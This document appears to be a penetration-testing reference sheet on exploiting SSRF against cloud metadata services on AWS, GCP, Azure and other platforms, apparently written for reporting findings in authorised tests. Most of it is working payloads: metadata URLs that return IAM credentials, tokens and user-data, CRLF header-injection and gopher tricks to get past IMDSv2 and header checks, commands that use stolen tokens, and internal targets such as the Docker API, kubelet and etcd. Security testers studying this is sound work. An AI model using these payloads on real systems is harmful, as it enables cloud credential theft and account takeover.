# Cloud metadata services via SSRF

The metadata service is the highest-value SSRF target in any cloud-hosted API:
it serves instance identity, user-data (often containing secrets/bootstrap
scripts), and **temporary credentials** for the attached role/identity.

## AWS — IMDS at 169.254.169.254

### IMDSv1 (no headers needed — GET-only SSRF is enough)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/iam/security-credentials/        ← lists role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>  ← credentials
http://169.254.169.254/latest/user-data                                  ← bootstrap scripts/secrets
http://169.254.169.254/latest/dynamic/instance-identity/document         ← account id, region
```

Credential response (critical finding — these are live STS creds):

```json
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
```

Use them: `AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity` — the caller identity output is the impact proof.

ECS/Fargate variant (link-local, container role):

```
http://169.254.170.2/v2/credentials/<guid>    (guid from AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### IMDSv2 (token dance — shows why IMDSv1 is the weakness)

```
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
        → returns <token>
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

A plain GET-URL SSRF cannot do the PUT + custom header, so IMDSv2-only
instances resist it. Reportable angles:
- If v1 responds, the finding is "SSRF + IMDSv1 enabled → credential theft".
- If v1 is disabled, demonstrate the SSRF with other internal targets and note
  IMDSv2 blocked escalation; the SSRF is still a finding.
- Sinks with request-method/header control (gopher://, raw-request proxies,
  header-injection, renderer JS `fetch()` with headers) **can** complete the
  v2 dance — test them. IMDSv2 also defaults to TTL/hop-limit 1, which blocks
  containers an extra hop away.

## GCP — metadata.google.internal (header required)

```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/                               (same service)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/   (user metadata, often keys)
?recursive=true    → dump an entire subtree as JSON
```

Required header: `Metadata-Flavor: Google` (legacy `X-Google-Metadata-Request:
True` on the deprecated `/v1beta1/` path, which skipped the header — try it,
old projects still allow it). Token response:

```json
{"access_token":"ya29....","expires_in":3599,"token_type":"Bearer"}
```

Use it: `curl -H 'Authorization: Bearer ya29...' https://www.googleapis.com/oauth2/v3/tokeninfo`
then hit GCS/compute APIs per the token's scopes.

Getting the header through SSRF: gopher:// raw request, header-injection in
the sink (`url=...%0d%0aMetadata-Flavor:%20Google` through a naive proxy),
renderer-executed JS, or sinks that forward client headers.

## Azure — IMDS at 169.254.169.254 (header required)

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Required header: `Metadata: true`. The identity token endpoint returns a
managed-identity bearer token for the requested `resource` — use it against
`https://management.azure.com` (ARM), Key Vault (`resource=https://vault.azure.net`),
or storage. Instance JSON leaks subscription ID, resource group, tags, network
config. Azure rejects requests containing an `X-Forwarded-For` header (anti-SSRF)
— raw-request primitives can omit it.

## Other on-host targets worth one probe each

```
http://169.254.169.254/metadata/v1/            DigitalOcean (no header; /user-data too)
http://169.254.169.254/openstack/latest/meta_data.json   OpenStack
http://169.254.169.254/latest/user-data        OpenStack/EC2-compat user data
http://100.100.100.200/latest/meta-data/       Alibaba Cloud
http://169.254.169.254/opc/v2/instance/        Oracle Cloud (Authorization: Bearer Oracle)
http://127.0.0.1:2375/containers/json          Docker API (unauth TCP → RCE via container create)
http://127.0.0.1:10255/pods                    kubelet read-only; :10250 authenticated kubelet
https://kubernetes.default.svc/api             in-cluster API server
http://127.0.0.1:8500/v1/kv/?recurse           Consul KV
http://127.0.0.1:2379/v2/keys/?recursive=true  etcd (often holds k8s secrets)
```

## Evidence to capture

For each successful metadata read: the exact request sent to the API, the API
response containing the metadata content, and (if credentials) a redacted
`sts get-caller-identity`/tokeninfo proof of validity. That is the
`http_exchange` block for `findings.report`; severity critical, scope `S:C`.
